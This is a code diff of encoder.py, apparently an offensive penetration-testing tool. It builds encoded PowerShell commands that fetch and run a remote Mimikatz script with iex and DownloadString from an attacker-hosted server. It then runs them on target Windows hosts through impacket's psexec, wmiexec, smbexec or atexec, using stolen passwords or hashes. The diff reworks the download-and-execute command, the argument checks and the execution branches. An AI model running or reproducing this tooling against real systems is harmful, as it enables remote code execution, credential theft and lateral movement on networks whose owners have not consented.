@@ -4,7 +4,7 @@
 Author: Christopher Duffy
 Date: July 2015
 Name: encoder.py
-Purpose: To encode commands that execute PowerShell scripts, also provides a wrapper for 
+Purpose: To encode commands that execute PowerShell scripts, also provides a wrapper for
 some of the impacket examples and fixes relevant functionality
 
 Copyright (c) 2015, Christopher Duffy & William Butler All rights reserved.
@@ -84,15 +84,15 @@ class Obfiscator:
     def invoker_psexec(self):
         # Invoke Mimikatz Directly
         # Creates the command iex (New-Object System.Net.WebClient).DownloadString('http://src_ip:src_port/payload'); function -argument
-        pre = "powershell.exe -Command Set-ExecutionPolicy Unrestricted -Scope CurrentUser; "
-        bit64 = "C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\\"
-        bit32 = "C:\Windows\System32\WindowsPowerShell\\v1.0\\"
-        tail = "PowerShell.exe -Command iex (New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (self.src_ip, self.src_port, self.payload, self.function, self.argument)
-        text64 = bit64 + tail
-        text32 = bit32 + tail
-        text = pre + tail
-        #powershell.exe -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://google.com/robots.txt','c:\robots.txt')}"
-        self.command = text32
+        #pre = "powershell.exe -Command Set-ExecutionPolicy Unrestricted -Scope CurrentUser; "
+        #bit64 = "C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\\"
+        #bit32 = "C:\Windows\System32\WindowsPowerShell\\v1.0\\"
+        tail = "iex (New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (self.src_ip, self.src_port, self.payload, self.function, self.argument)
+        #text64 = bit64 + tail
+        #text32 = bit32 + tail
+        #text = pre + tail
+        command = '''powershell.exe -Command "& {'''+ tail +'''}"'''
+        self.command = command
 
     def downloader(self):
         # Download String Directly
@@ -176,11 +176,6 @@ def main():
         parser.print_help()
         sys.exit(1)
 
-    if args.invoker and args.payload == None:
-        print("[!] This script requires either a command, an invoker attack, or a downloader attack")
-        parser.print_help()
-        sys.exit(1)
-
     # Set Constructors
     verbose = args.verbose             # Verbosity level
     src_port = args.src_port           # Port to source the Mimikatz script on
@@ -203,6 +198,15 @@ def main():
     execution = ""
     supplement = ""
     hash = None
+    methods = False
+
+    if smbexec_cmd or wmiexec_cmd or psexec_cmd or atexec_cmd:
+        methods = True
+
+    if invoker and payload == None or methods == False:
+        print("[!] This script requires either a command, an invoker attack, or a downloader attack")
+        parser.print_help()
+        sys.exit(1)
 
     if ":" in pwd and pwd.count(':') == 1:
         if pwd.startswith(':'):
@@ -238,6 +242,14 @@ def main():
             print(1)
             sys.exit("[!] If you are trying to exploit a system you need at least one target")
 
+    gateways = get_gateways()
+    network_ifaces = get_networks(gateways)
+    if src_ip == None:
+        try:
+           src_ip = network_ifaces[interface]['addr']
+        except Exception as e:
+            print("[!] No IP address found on interface %s") % (interface)
+
     if invoker:
         execution = "invoker"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
@@ -255,14 +267,6 @@ def main():
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
         command = x.return_command()
 
-    gateways = get_gateways()
-    network_ifaces = get_networks(gateways)
-    if src_ip == None:
-        try:
-           src_ip = network_ifaces[interface]['addr']
-        except Exception as e:
-            print("[!] No IP address found on interface %s") % (interface)
-
     if "invoker" in execution:
         supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
 [*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.'''
@@ -276,43 +280,23 @@ def main():
 [*] This execution script is double encoded script.
 '''
 
-    x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
-    if hash:
-        if psexec_cmd:
-            attack=psexec.PSEXEC(command, path="C:\\", protocols="445/SMB", username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None)
-            attack.run(target)
-        elif wmiexec_cmd:
-            attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash)
-            attack.run(target)
-        elif smbexec_cmd:
-            attack=smbexec.CMDEXEC(protocols = "445/SMB", username = usr, password = pwd, domain = dom, hashes = hash)
-            attack.run(target)
-        elif atexec_cmd:
-            if command == "cmd.exe":
-                sys.exit("[!] Please provide a viable command for execution")
-            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
-            attack.play(target)
-        else:
-            print(instructions)
-            print(x.return_command())
+    if psexec_cmd:
+        attack=psexec.PSEXEC(command, path="C:\\", protocols="445/SMB", username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None)
+        attack.run(target)
+    elif wmiexec_cmd:
+        attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash)
+        attack.run(target)
+    elif smbexec_cmd:
+        attack=smbexec.CMDEXEC(protocols = "445/SMB", username = usr, password = pwd, domain = dom, hashes = hash)
+        attack.run(target)
+    elif atexec_cmd:
+        if command == "cmd.exe":
+            sys.exit("[!] Please provide a viable command for execution")
+        attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
+        attack.play(target)
     else:
-        if psexec_cmd:
-            attack=psexec.PSEXEC(command, path="C:\\", protocols="445/SMB", username = usr, password = pwd, domain = dom, copyFile = None, exeFile = None)
-            attack.run(target)
-        elif wmiexec_cmd:
-            attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom)
-            attack.run(target)
-        elif smbexec_cmd:
-            attack=smbexec.CMDEXEC(protocols = "445/SMB", username = usr, password = pwd, domain = dom)
-            attack.run(target)
-        elif atexec_cmd:
-            if command == "cmd.exe":
-                sys.exit("[!] Please provide a viable command for execution")
-            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
-            attack.play(target)
-        else:
-            print(instructions)
-            print(x.return_command())
+        print(instructions)
+        print(x.return_command())
 
 if __name__ == '__main__':
     main()
